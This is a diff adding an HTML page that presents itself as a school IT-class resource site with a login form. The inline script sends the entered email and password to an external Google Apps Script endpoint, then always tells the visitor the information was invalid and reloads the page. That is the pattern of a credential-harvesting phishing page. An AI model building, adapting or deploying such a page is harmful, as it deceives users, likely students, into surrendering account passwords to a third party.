@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>School Registration</title>
+    <link rel="stylesheet" href="main.css">
+</head>
+
+<body>
+    <header>
+        <h1 class="logo">Information<br>Technology</h1>
+        <nav class="navigation">
+            <a href="11th IT&ITeS Papers.pdf">Class 11TH</a> <a href="Python-Cheat-Sheet.pdf">Python</a>
+            <a href="HTML Codes.pdf">HTML</a>
+            <a href="Questions Nd Answers.pdf">Questions</a>
+            <!-- <button class="btnLogin-popup" type="submit">Login</button> -->
+        </nav>
+    </header>
+    <div class="wrapper">
+        <div class="form-box login">
+            <h2>LoGiN</h2>
+
+            <form method="post" action="" name="contactform" id="contact">
+                <div class="input-box">
+                    <span class="icon"></span>
+                    <input type="email" name="Email" required>
+                    <label>Email</label>
+                </div>
+                <div class="input-box">
+                    <span class="icon"></span>
+                    <input type="password" name="Password" required>
+                    <label>Password</label>
+                </div>
+                <div class="remember-forget">
+                    <label><input type="checkbox">
+                        Remember Me</label>
+                </div>
+                <button type="submit" class="btn">Login</button>
+            </form>
+        </body>
+            <!-- <div class="login-register"> -->
+            <!-- <p>Don't Have an accout?</p> -->
+        </div>
+        <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbzPEugYAvL4rxVPmMX49WzcLa46lp361I_-jZKE2uyfnVrnxAxLbYdThhkPUUF_Zc2uXg/exec'
+            const form = document.forms['contactform']
+            form.addEventListener('submit', e => {
+                e.preventDefault()
+                fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                    .then(response => alert("Please! Enter valid Information."))
+                    .then(() => { window.location.reload(); })
+                    .catch(error => console.error('Error!', error.message))
+            })
+        </script>
+
+</html>
